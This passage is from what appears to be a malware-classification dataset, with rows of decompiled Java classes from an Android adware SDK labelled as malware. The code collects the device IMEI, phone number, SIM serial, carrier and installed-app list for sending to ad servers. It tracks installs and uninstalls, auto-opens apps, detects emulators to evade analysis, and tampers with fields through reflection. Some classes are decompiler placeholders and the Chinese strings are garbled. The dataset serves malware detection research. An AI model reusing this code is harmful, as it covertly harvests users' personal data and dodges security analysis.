tVar3=this.b;     Context context3=this.a;     a2=this.b.a(this.a,(List<Bitmap>)arrayList);     tVar3.a(context3,a2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\w.code","class w extends TimerTask {   final Handler a;   final Context b;   final t c;   public w(  t tVar,  Handler handler,  Context context){     this.c=tVar;     this.a=handler;     this.b=context;   }   @Override public void run(){     this.c.a(this.a,this.b);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\x.code","public interface x {   void a(  BusinessDataContext<AppWallAdInfo> businessDataContext);   void a(  BusinessDataContext<AppWallAdInfo> businessDataContext,  List<AppWallAdInfo> list); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\y.code","public abstract class y<T extends AdInfo> implements com.fw.tzthree.c.e<T> {   public static Map<Integer,y<?>> j;   private static y<?> a(  Context context,  int i){     y<?> yVar;     String a=com.fw.tzthree.d.g.a(context,i);     if ("""".equals(a)) {       return null;     }     try {       yVar=(y)Class.forName(a).newInstance();     }  catch (    ClassNotFoundException e) {       e.printStackTrace();       yVar=null;     } catch (    IllegalAccessException e2) {       e2.printStackTrace();       yVar=null;     } catch (    InstantiationException e3) {       e3.printStackTrace();       yVar=null;     }     return yVar;   }   public String a(  Context context,  com.fw.tzthree.db.a<T> aVar){     String a=com.fw.tzthree.d.g.a(context,com.fw.tzthree.b.a.bc);     return a == null ? aVar.a().getAppKey() : a;   }   private void a(  Context context,  com.fw.tzthree.db.a<T> aVar,  String str){     if (aVar.a() == null) {       DeviceInfo deviceInfo=new DeviceInfo();       deviceInfo.setId(0L);       deviceInfo.setAppKey(str);       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       deviceInfo.setImei(com.fw.tzthree.d.l.a(context,telephonyManager));       deviceInfo.setBrand(Build.MANUFACTURER);       deviceInfo.setDevAppPackage(context.getPackageName());       deviceInfo.setMobileSystem(com.fw.tzthree.b.a.e);       deviceInfo.setModel(Build.MODEL);       deviceInfo.setNetwork(com.fw.tzthree.d.e.c(context));       String networkOperator=telephonyManager.getNetworkOperator();       if (networkOperator != null && networkOperator.length() >= 3) {         deviceInfo.setOperator(telephonyManager.getNetworkOperator().substring(3));       }       deviceInfo.setPhoneNumber(com.fw.tzthree.d.l.b(context,telephonyManager));       deviceInfo.setResolution(com.fw.tzthree.d.l.b(context));       deviceInfo.setSimSerialNum(com.fw.tzthree.d.l.c(context,telephonyManager));       deviceInfo.setSystemVersion(Build.VERSION.RELEASE);       deviceInfo.setSdkVersion(com.fw.tzthree.b.a.d);       aVar.a(deviceInfo);     }   }   private void a(  Context context,  String str){     com.fw.tzthree.db.a<T> aVar=new com.fw.tzthree.db.a<>();     aVar.c(context);     b(context,aVar);     a(context,aVar,str);     saveCommonBusiness(getAdType(),this);     com.fw.tzthree.d.g.a(context,getAdType(),getClassName());   }   private void a(  Context context,  boolean z){     String name=getClass().getPackage().getName();     com.fw.tzthree.d.f fVar=new com.fw.tzthree.d.f(context,name.substring(0,name.lastIndexOf(""."")));     if (fVar.a(getAdType())) {       return;     }     if (z) {       fVar.c(com.fw.tzthree.b.a.bc);     }     fVar.a();     fVar.b(com.fw.tzthree.b.a.k);     fVar.a(com.fw.tzthree.b.a.l,com.fw.tzthree.b.a.u,null);     fVar.a(com.fw.tzthree.b.a.m,com.fw.tzthree.b.a.s,com.fw.tzthree.b.a.v);     fVar.a(com.fw.tzthree.b.a.m,com.fw.tzthree.b.a.t,com.fw.tzthree.b.a.v);     fVar.d(com.fw.tzthree.b.a.n);     a(fVar);     fVar.a(getAdType(),true);   }   private void b(  Context context,  com.fw.tzthree.db.a<T> aVar){     if (aVar.c() == 0) {       PackageManager packageManager=context.getPackageManager();       List<PackageInfo> installedPackages=packageManager.getInstalledPackages(8192);       ArrayList arrayList=new ArrayList();       for (      PackageInfo packageInfo : installedPackages) {         InstalledApp installedApp=new InstalledApp();         installedApp.setAppName(packageInfo.applicationInfo.loadLabel(packageManager).toString());         installedApp.setPackageName(packageInfo.packageName);         arrayList.add(installedApp);       }       aVar.a(arrayList);     }   }   private void b(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.getCallbackListener() != null) {       businessDataContext.getCallbackListener().onSuccess();     }   }   private void c(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.getCallbackListener() != null) {       businessDataContext.getCallbackListener().onFailure();     }   }   public static synchronized Map<Integer,y<?>> getBusinessMap(){     Map<Integer,y<?>> map; synchronized (y.class) {       if (j == null) {         j=new HashMap();       }       map=j;     }     return map;   }   public static synchronized y<?> getCommonBusiness(  Context context,  int i){     y<?> yVar; synchronized (y.class) {       yVar=getBusinessMap().get(Integer.valueOf(i));       if (yVar == null) {         yVar=a(context,i);         saveCommonBusiness(i,yVar);       }     }     return yVar;   }   public static synchronized void saveCommonBusiness(  int i,  y<?> yVar){ synchronized (y.class) {       getBusinessMap().put(Integer.valueOf(i),yVar);     }   }   protected abstract void a(  com.fw.tzthree.d.f fVar);   abstract void a(  BusinessDataContext<T> businessDataContext);   abstract void a(  BusinessDataContext<T> businessDataContext,  List<T> list);   public abstract com.fw.tzthree.c.d addFilterPipelineNode(  com.fw.tzthree.c.d dVar,  BusinessDataContext businessDataContext);   public void click(  AdInfo adInfo){   }   public abstract int getAdType();   public String getClassName(){     return getClass().getPackage().getName() + ""."" + getClass().getSimpleName();   }   public DeviceInfo getDeviceInfo(){     return new com.fw.tzthree.db.a().a();   }   public List<DownloadInfo> getDownloadInfoByPackageName(  String str){     return new com.fw.tzthree.db.a().b(str);   }   public Setting getSetting(  Context context,  int i){     return new com.fw.tzthree.db.a().a(i);   }   public void init(  Context context){     try {       a(context,true);       a(context,com.fw.tzthree.d.g.a(context,com.fw.tzthree.b.a.bc));     }  catch (    Exception e) {       Log.e(""tag"",e.getMessage());     }   }   public void init(  Context context,  String str){     try {       a(context,false);       a(context,str);     }  catch (    Exception e) {       Log.e(""tag"",e.getMessage());     }   }   public boolean isInstalled(  Context context,  String str){     return new com.fw.tzthree.db.a().a(str);   }   public void onAppInstall(){   }   public void onAppInstalled(  Context context,  String str,  boolean z,  AdInfo adInfo,  com.fw.tzthree.db.a<?> aVar,  int i){     if (adInfo == null) {       return;     }     if (adInfo.getAdId() != null) {       com.fw.tzthree.d.u.a(context,3038375 + adInfo.getAdId().intValue() + (i * 1000));     }     if (!z) {       adInfo.setAdId(null);     }     if (z) {       postActionRequest(context,adInfo,7);     }  else     if (aVar.a() != null) {       new Handler().postDelayed(new aa(this,context,adInfo),5000L);     }     context.getPackageManager();     try {       PackageManager packageManager=context.getPackageManager();       ApplicationInfo applicationInfo=packageManager.getApplicationInfo(str,128);       String charSequence=applicationInfo.loadLabel(packageManager).toString();       ArrayList arrayList=new ArrayList();       InstalledApp installedApp=new InstalledApp();       installedApp.setAppName(charSequence);       installedApp.setPackageName(str);       arrayList.add(installedApp);       aVar.a(arrayList);       if (z) {         List<AppInfo> d=aVar.d(str);         if (d.size() > 0) {           AppInfo appInfo=d.get(0);           appInfo.setInstallTime(Long.valueOf(new File(applicationInfo.sourceDir).lastModified()));           aVar.a(appInfo);         }       }     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();     }     if (!z || com.fw.tzthree.d.aa.a(context,adInfo) == null || com.fw.tzthree.d.aa.a(context,adInfo).getAutoOpen() == null || !com.fw.tzthree.d.aa.a(context,adInfo).getAutoOpen().isOn()) {       return;     }     PackageManager packageManager2=context.getPackageManager();     Intent intent=new Intent();     try {       intent=packageManager2.getLaunchIntentForPackage(str);     }  catch (    ActivityNotFoundException e2) {       e2.printStackTrace();     }     context.startActivity(intent);     onAppOpened(context,adInfo);   }   public void onAppOpened(  Context context,  AdInfo adInfo){     postActionRequest(context,adInfo,8);   }   public void onAppUnInstall(  Context context,  String str,  com.fw.tzthree.db.a<?> aVar,  AdInfo adInfo,  int i,  long j2){     Integer uninstallInterval=aVar.a(i).getUninstallInterval();     if (uninstallInterval == null || uninstallInterval.longValue() * 1000 < com.fw.tzthree.d.ab.a() - j2) {       return;     }     postActionRequest(context,adInfo,9);     aVar.e(str);   }   @Override public void onCallBack(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.getResponseData() == null || businessDataContext.getResponseData().getAd() == null) {       c(businessDataContext);       a(businessDataContext);       return;     }     List<T> adList=businessDataContext.getResponseData().getAd().getAdList();     if (adList == null || adList.size() == 0) {       c(businessDataContext);       a(businessDataContext);     }  else {       b(businessDataContext);       a(businessDataContext,adList);     }   }   public void onDownload(){   }   public void onDownloadSuccess(){   }   public void onNetWorkChange(  Context context,  String str){   }   public void postActionRequest(  Context context,  AdInfo adInfo,  Integer num){     com.fw.tzthree.c.b.a.a().a(new z(this,context,num,adInfo));   }   public void postDeviceInfoRequest(  int i){   }   public void reInit(  Context context){     com.fw.tzthree.db.a<T> aVar=new com.fw.tzthree.db.a<>();     aVar.c(context);     String a=a(context,aVar);     BusinessDataContext businessDataContext=new BusinessDataContext();     businessDataContext.setDbHelper(aVar);     businessDataContext.setAppKey(a);     businessDataContext.setContext(context);     saveCommonBusiness(getAdType(),this);   }   public void requestAdList(  Context context,  Handler handler,  CallbackListener callbackListener){     AdNode<T> adNode=new AdNode<>();     adNode.setAdType(Integer.valueOf(getAdType()));     adNode.setCategory(0);     requestAdList(context,adNode,handler,callbackListener);   }   public void requestAdList(  Context context,  AdNode<T> adNode,  Handler handler,  CallbackListener callbackListener){     BusinessDataContext<T> businessDataContext=new BusinessDataContext<>();     com.fw.tzthree.db.a<T> aVar=new com.fw.tzthree.db.a<>();     businessDataContext.setDbHelper(aVar);     businessDataContext.setAppKey(a(context,aVar));     businessDataContext.setContext(context);     businessDataContext.setHandler(handler);     businessDataContext.setAdType(getAdType());     businessDataContext.setCallbackListener(callbackListener);     businessDataContext.setRequestCallBack(this);     RootNode<T> rootNode=new RootNode<>();     rootNode.setAd(adNode);     businessDataContext.setRequestData(rootNode);     businessDataContext.setUrl(com.fw.tzthree.b.a.Y);     new com.fw.tzthree.c.a().a(businessDataContext,this);   }   public RootNode<T> retryPostFaildRequest(  BusinessDataContext<T> businessDataContext){     return null;   }   public void saveAppInfo(  AppInfo appInfo){     new com.fw.tzthree.db.a().a(appInfo);   }   public void saveDownloadInfo(  DownloadInfo downloadInfo){     new com.fw.tzthree.db.a().a(downloadInfo);   }   public void saveDownloadSuccessInfo(  DownloadSuccessInfo downloadSuccessInfo){     new com.fw.tzthree.db.a().a(downloadSuccessInfo);   }   public void show(  AdInfo adInfo){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\z.code","public class z implements Runnable {   final Context a;   final Integer b;   final AdInfo c;   final y d;   public z(  y yVar,  Context context,  Integer num,  AdInfo adInfo){     this.d=yVar;     this.a=context;     this.b=num;     this.c=adInfo;   }   @Override public void run(){     String a;     com.fw.tzthree.db.a aVar=new com.fw.tzthree.db.a();     DeviceInfo a2=aVar.a();     if (TextUtils.isEmpty(a2.getImei())) {       a2.setImei(com.fw.tzthree.d.l.a(this.a,(TelephonyManager)this.a.getSystemService(""phone"")));     }     if (TextUtils.isEmpty(a2.getImei())) {       return;     }     Action action=new Action();     action.setAction(this.b);     action.setAdId(this.c.getAdId());     action.setAppName(this.c.getAppName());     action.setCount(1);     action.setDate(String.valueOf(com.fw.tzthree.d.ab.a()));     action.setPackageName(this.c.getPackageName());     ArrayList arrayList=new ArrayList();     arrayList.add(action);     ActionNode actionNode=new ActionNode();     actionNode.setActions(arrayList);     AdNode adNode=new AdNode();     adNode.setAdType(Integer.valueOf(this.d.getAdType()));     RootNode rootNode=new RootNode();     rootNode.setAction(actionNode);     rootNode.setAd(adNode);     BusinessDataContext businessDataContext=new BusinessDataContext();     businessDataContext.setRequestData(rootNode);     businessDataContext.setUrl(com.fw.tzthree.b.a.aa);     a=this.d.a(this.a,aVar);     businessDataContext.setDbHelper(aVar);     businessDataContext.setAppKey(a);     businessDataContext.setContext(this.a);     businessDataContext.setAdType(this.d.getAdType());     new com.fw.tzthree.c.a().b(businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\a.code","public class a {   public static Drawable a(  Context context,  String str){     File file=new File(context.getDir(com.fw.tzthree.b.a.b,0),str);     if (!file.exists()) {       a(context);     }     return Drawable.createFromPath(file.getAbsolutePath());   }   public static void a(  android.content.Context r6){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.d.a.a(android.content.Context):void"");   }   public static Bitmap b(  Context context,  String str){     File file=new File(context.getDir(com.fw.tzthree.b.a.b,0),str);     if (!file.exists()) {       a(context);     }     return BitmapFactory.decodeFile(file.getAbsolutePath());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\aa.code","!org.eclipse.jdt.core.dom.TypeDeclaration@438309ba"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\ab.code","public class ab {   public static long a(){     return System.currentTimeMillis();   }   public static boolean a(  long j,  long j2){     Calendar calendar=Calendar.getInstance();     calendar.setTime(new Date(j));     Calendar calendar2=Calendar.getInstance();     calendar2.setTime(new Date(j2));     return ((calendar.get(1) == calendar2.get(1)) && calendar.get(2) == calendar2.get(2)) && calendar.get(5) == calendar2.get(5);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\ac.code","public class ac {   public static ColorStateList a(  int i,  int i2){     return new ColorStateList(new int[][]{new int[]{R.attr.state_pressed,R.attr.state_enabled},new int[0]},new int[]{i2,i});   }   public static GradientDrawable a(  int i,  int i2,  boolean z){     GradientDrawable gradientDrawable=new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{Color.parseColor(""#dce7da""),-1});     gradientDrawable.setCornerRadius(i2);     if (z) {       gradientDrawable.setGradientRadius(60.0f);       gradientDrawable.setGradientType(0);     }  else {       gradientDrawable.setColor(i);     }     return gradientDrawable;   }   public static LayerDrawable a(  int i){     GradientDrawable gradientDrawable=new GradientDrawable();     gradientDrawable.setCornerRadius(8.0f);     gradientDrawable.setColor(Color.parseColor(""#54bc4d""));     gradientDrawable.setColor(i);     return new LayerDrawable(new ClipDrawable[]{new ClipDrawable(gradientDrawable,2,1)});   }   public static StateListDrawable a(  Drawable drawable,  Drawable drawable2){     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed,R.attr.state_enabled},drawable);     stateListDrawable.addState(new int[0],drawable2);     return stateListDrawable;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\b.code","public class b {   public static String a(){     return com.fw.tzthree.b.a.K[com.fw.tzthree.b.a.J];   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\c.code","public final class c {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b=new int[256];   private static final byte[] c;   private static final byte[] d; static {     Arrays.fill(b,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;     c=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     d=new byte[128];     for (int i2=0; i2 < 128; i2++) {       d[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       d[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       d[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       d[i5]=(byte)((i5 - 48) + 52);     }     d[43]=62;     d[47]=63;   }   private static boolean a(  byte b2){     if (b2 == 61) {       return true;     }     if (b2 < 0 || b2 >= 128) {       return false;     }     return d[b2] != -1;   }   public static final byte[] a(  String str){     int i=0;     String b2=b(str);     byte[] bArr=b2.charAt(b2.length() + (-2)) == '=' ? new byte[(((b2.length() / 4) - 1) * 3) + 1] : b2.charAt(b2.length() + (-1)) == '=' ? new byte[(((b2.length() / 4) - 1) * 3) + 2] : new byte[(b2.length() / 4) * 3];     int i2=0;     while (i2 < b2.length() - 4) {       byte b3=d[b2.charAt(i2)];       byte b4=d[b2.charAt(i2 + 1)];       byte b5=d[b2.charAt(i2 + 2)];       byte b6=d[b2.charAt(i2 + 3)];       bArr[i]=(byte)((b3 << 2) | (b4 >> 4));       bArr[i + 1]=(byte)((b4 << 4) | (b5 >> 2));       bArr[i + 2]=(byte)((b5 << 6) | b6);       i2+=4;       i+=3;     }     if (b2.charAt(b2.length() - 2) == '=') {       bArr[bArr.length - 1]=(byte)((d[b2.charAt(b2.length() - 4)] << 2) | (d[b2.charAt(b2.length() - 3)] >> 4));     }  else     if (b2.charAt(b2.length() - 1) == '=') {       byte b7=d[b2.charAt(b2.length() - 4)];       byte b8=d[b2.charAt(b2.length() - 3)];       byte b9=d[b2.charAt(b2.length() - 2)];       bArr[bArr.length - 2]=(byte)((b7 << 2) | (b8 >> 4));       bArr[bArr.length - 1]=(byte)((b8 << 4) | (b9 >> 2));     }  else {       byte b10=d[b2.charAt(b2.length() - 4)];       byte b11=d[b2.charAt(b2.length() - 3)];       byte b12=d[b2.charAt(b2.length() - 2)];       byte b13=d[b2.charAt(b2.length() - 1)];       bArr[bArr.length - 3]=(byte)((b10 << 2) | (b11 >> 4));       bArr[bArr.length - 2]=(byte)((b11 << 4) | (b12 >> 2));       bArr[bArr.length - 1]=(byte)((b12 << 6) | b13);     }     return bArr;   }   public static final char[] a(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   }   private static String b(  String str){     StringBuffer stringBuffer=new StringBuffer();     int length=str.length();     for (int i=0; i < length; i++) {       if (a((byte)str.charAt(i))) {         stringBuffer.append(str.charAt(i));       }     }     return stringBuffer.toString();   }   public static final String b(  byte[] bArr,  boolean z){     return new String(a(bArr,z));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\d.code","public class d {   protected static Field a(  Class cls,  String str){     while (cls != Object.class) {       try {         return cls.getDeclaredField(str);       }  catch (      NoSuchFieldException e) {         cls=cls.getSuperclass();       }     }     return null;   }   protected static Field a(  Object obj,  String str){     return a((Class)obj.getClass(),str);   }   public static void a(  Object obj,  String str,  Object obj2){     Field a=a(obj,str);     if (a == null) {       throw new IllegalArgumentException(""Could not find field ["" + str + ""] on target [""+ obj+ ""]"");     }     a(a);     try {       a.set(obj,obj2);     }  catch (    IllegalAccessException e) {       Log.e(""zbkc"","""",e);     }   }   protected static void a(  Field field){     if (Modifier.isPublic(field.getModifiers()) && Modifier.isPublic(field.getDeclaringClass().getModifiers())) {       return;     }     field.setAccessible(true);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e39ebbb"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\f.code","public class f {   private PackageManager a;   private Context b;   private String c;   private String[] d={""android.permission.READ_PHONE_STATE"",""android.permission.ACCESS_NETWORK_STATE"",""android.permission.ACCESS_WIFI_STATE"",""android.permission.WRITE_EXTERNAL_STORAGE"",""android.permission.INTERNET"",""android.permission.ACCESS_COARSE_LOCATION""};   public f(  Context context,  String str){     this.a=context.getPackageManager();     this.b=context;     this.c=str;   }   public void a(){     for (    String str : this.d) {       if (this.a.checkPermission(str,this.b.getPackageName()) == -1) {         throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…æ·¡æ–‡ä»¶ä¸­æ­£ç¡®é…�ç½®æ�ƒé™�:"" + str);       }     }   }   public void a(  int i,  boolean z){     z.a(this.b).edit().putBoolean(String.valueOf(i),z).commit();   }   public void a(  String str){     if (this.a.checkPermission(str,this.b.getPackageName()) == -1) {       throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…æ·¡æ–‡ä»¶ä¸­æ­£ç¡®é…�ç½®æ�ƒé™�:"" + str);     }   }   public void a(  String str,  String str2,  String str3){     try {       this.a.getReceiverInfo(new ComponentName(this.b,this.c + str),2);       Intent intent=new Intent();       intent.setAction(str2);       if (!TextUtils.isEmpty(str3)) {         intent.setData(Uri.parse(str3));       }       String str4="""";       Iterator<ResolveInfo> it=this.a.queryBroadcastReceivers(intent,2).iterator();       while (true) {         if (!it.hasNext()) {           break;         }         ResolveInfo next=it.next();         String str5=next.activityInfo.name;         if ((this.c + str).equals(str5) && next.activityInfo.applicationInfo.packageName.equals(this.b.getPackageName())) {           str4=str5;           break;         }         str4=str5;       }       if ((this.c + str).equals(str4)) {       }  else {         throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…å�•æ–‡ä»¶ä¸­æ­£ç¡®é…�"" + this.c + str+ ""ä¸­çš„action:""+ intent.getAction());       }     }  catch (    PackageManager.NameNotFoundException e) {       throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…å�•æ–‡ä»¶ä¸­æ­£ç¡®é…�"" + this.c + str);     }   }   public boolean a(  int i){     return z.a(this.b).getBoolean(String.valueOf(i),false);   }   public void b(  String str){     try {       this.a.getServiceInfo(new ComponentName(this.b,this.c + str),0);     }  catch (    PackageManager.NameNotFoundException e) {       throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…å�•æ–‡ä»¶ä¸­æ­£ç¡®é…�ç½®"" + this.c + str);     }   }   public void c(  String str){     if (g.a(this.b,str) == null) {       throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…å�•æ–‡ä»¶ä¸­æ­£ç¡®é…�ç½®"" + str + ""çš„MetaData"");     }   }   public void d(  String str){     try {       this.a.getActivityInfo(new ComponentName(this.b,this.c + str),0);     }  catch (    PackageManager.NameNotFoundException e) {       throw new RuntimeException(""è¯·æ ¹æ�®æ–‡æ¡£æ��è¿°åœ¨æ¸…å�•æ–‡ä»¶ä¸­æ­£ç¡®é…�"" + this.c + str);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\g.code","public class g {   public static long a(){     StatFs statFs=new StatFs(Environment.getExternalStorageDirectory().getPath());     return ((statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024) / 1024;   }   public static Bitmap a(  Context context,  int i,  int i2,  String str){     return n.a(a.b(context,str),n.a(context,i),n.a(context,i2));   }   public static String a(  Context context,  int i){     SharedPreferences sharedPreferences=context.getSharedPreferences(com.fw.tzthree.b.a.aZ,0);     String string=sharedPreferences.getString(String.valueOf(i),"""");     if (TextUtils.isEmpty(string)) {       string=sharedPreferences.getString(String.valueOf(1),"""");     }     if (TextUtils.isEmpty(string)) {       string=sharedPreferences.getString(String.valueOf(2),"""");     }     if (TextUtils.isEmpty(string)) {       string=sharedPreferences.getString(String.valueOf(3),"""");     }     if (TextUtils.isEmpty(string)) {       string=sharedPreferences.getString(String.valueOf(5),"""");     }     if (TextUtils.isEmpty(string)) {       string=sharedPreferences.getString(String.valueOf(4),"""");     }     if (TextUtils.isEmpty(string)) {       string=sharedPreferences.getString(String.valueOf(6),"""");     }     return TextUtils.isEmpty(string) ? sharedPreferences.getString(String.valueOf(7),"""") : string;   }   public static String a(  Context context,  String str){     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo.metaData != null) {         return applicationInfo.metaData.getString(str);       }     }  catch (    PackageManager.NameNotFoundException e) {     }     return null;   }   public static void a(  Context context,  int i,  String str){     context.getSharedPreferences(com.fw.tzthree.b.a.aZ,0).edit().putString(String.valueOf(i),str).commit();   }   public static boolean a(  Context context){     boolean z;     try {       String deviceId=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();       if (deviceId != null && deviceId.equals(""000000000000000"")) {         return true;       }       if (!Build.MODEL.equals(""sdk"")) {         if (!Build.MODEL.equals(""google_sdk"")) {           z=false;           return z;         }       }       z=true;       return z;     }  catch (    Exception e) {       return false;     }   }   public static Drawable b(  Context context,  int i,  int i2,  String str){     return n.a(context,a(context,i,i2,str));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.d\h.code","public class h {   public static <T extends AdInfo>T a(  CustomAd customAd){     CustomAdInfo customAdInfo=new CustomAdInfo();     customAdInfo.setAdId(customAd.getAdId());     customAdInfo.setAppName(customAd.getAppName());     customAdInfo.setAppSize(customAd.getAppSize());     customAdInfo.setAppVersion(customAd.getAppVersion());     customAdInfo.setG2Switches(customAd.getG2Switches());     customAdInfo.setG3Switches(customAd.getG3Switches());     customAdInfo.setIcon(customAd.getIcon());     customAdInfo.setIntro(customAd.getIntro());     customAdInfo.setKind(customAd.getKind());     customAdInfo.setPackageName(customAd.getPackageName());     customAdInfo.setPrintscreen(customAd.getPrintscreen());     customAdInfo.setRecommend(customAd.getRecommend());     customAdInfo.setShowPeriod(customAd.getShowPeriod());     customAdInfo.setUrl(customAd.getUrl());     customAdInfo.setWifiSwitches(customAd.getWifiSwitches());     customAdInfo.setDiyImg(customAd.getDiyImg());     return customAdInfo;   }   public static <T extends AdInfo>T a(  FullCoverAd fullCoverAd){     TableplaqueAdInfo tableplaqueAdInfo=new TableplaqueAdInfo();     tableplaqueAdInfo.setAdId(fullCoverAd.getAdId());     tableplaqueAdInfo.setAppName(fullCoverAd.getAppName());     tableplaqueAdInfo.setAppSize(fullCoverAd.getAppSize());     tableplaqueAdInfo.setAppVersion(fullCoverAd.getAppVersion());     tableplaqueAdInfo.setG2Switches(fullCoverAd.getG2Switches());     tableplaqueAdInfo.setG3Switches(fullCoverAd.getG3Switches());     tableplaqueAdInfo.setIcon(fullCoverAd.getIcon());     tableplaqueAdInfo.setIntro(fullCoverAd.getIntro());     tableplaqueAdInfo.setKind(fullCoverAd.getKind());     tableplaqueAdInfo.setPackageName(fullCoverAd.getPackageName());     tableplaqueAdInfo.setPrintscreen(fullCoverAd.getPrintscreen());     tableplaqueAdInfo.setRecommend(fullCoverAd.getRecommend());     tableplaqueAdInfo.setShowPeriod(fullCoverAd.getShowPeriod());     tableplaqueAdInfo.setUrl(fullCoverAd.getUrl());     tableplaqueAdInfo.setWifiSwitches(fullCoverAd.getWifiSwitches());     tableplaqueAdInfo.setId(fullCoverAd.getId());     tableplaqueAdInfo.setExpires(fullCoverAd.getExpires());     tableplaqueAdInfo.setTablePlaqueImg(fullCoverAd.getTablePlaqueImg());     tableplaqueAdInfo.setShowStyle(fullCoverAd.getShowStyle());     tableplaqueAdInfo.setShowTime(fullCoverAd.getShowTime());     return tableplaqueAdInfo;   }   public static <T extends AdInfo>T a(  FullScreenAd fullScreenAd){     FullScreenAdInfo fullScreenAdInfo=new FullScreenAdInfo();     fullScreenAdInfo.setAdId(fullScreenAd.getAdId());     fullScreenAdInfo.setAppName(fullScreenAd.getAppName());     fullScreenAdInfo.setAppSize(fullScreenAd.getAppSize());     fullScreenAdInfo.setAppVersion(fullScreenAd.getAppVersion());     fullScreenAdInfo.setG2Switches(fullScreenAd.getG2Switches());     fullScreenAdInfo.setG3Switches(fullScreenAd.getG3Switches());     fullScreenAdInfo.setIcon(fullScreenAd.getIcon());     